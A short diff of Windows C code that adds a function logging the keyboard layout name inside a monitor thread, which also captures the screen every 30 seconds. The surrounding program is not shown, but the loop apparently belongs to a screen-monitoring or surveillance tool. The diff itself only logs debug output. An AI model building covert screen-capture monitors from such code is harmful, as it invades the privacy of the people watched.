@@ -66,6 +66,18 @@ cleanup:
 	FreeLibrary(hModule);
 }
 
+
+VOID
+	GetKbdLayout()
+{
+	WCHAR kbdLayout[MAX_PATH];
+	memset(kbdLayout, 0, sizeof(kbdLayout));
+	if (GetKeyboardLayoutName(kbdLayout))
+		DebugPrint("kbdLayout=%ws\n", kbdLayout);
+	else
+		DebugPrint("GetKeyboardLayoutName failed with err=%d", GetLastError());
+}
+
 DWORD 
 WINAPI
 	MonitorMainThreadRoutine(
@@ -73,11 +85,15 @@ WINAPI
 )
 {
 	PMONITOR Monitor = (PMONITOR)lpParameter;
-	DebugPrint("Monitor thread starting processId=%x, threadId=%x\n", GetCurrentProcessId(), GetCurrentThreadId());
 
+	DebugPrint("Monitor thread starting processId=%x, threadId=%x\n", GetCurrentProcessId(), GetCurrentThreadId());
+	
 	PrepareMainThread();
 
+
+	GetKbdLayout();
 	while (!Monitor->Stopping) {
+		GetKbdLayout();
 		CaptureScreenCallback();
 		Sleep(30000);
 	}
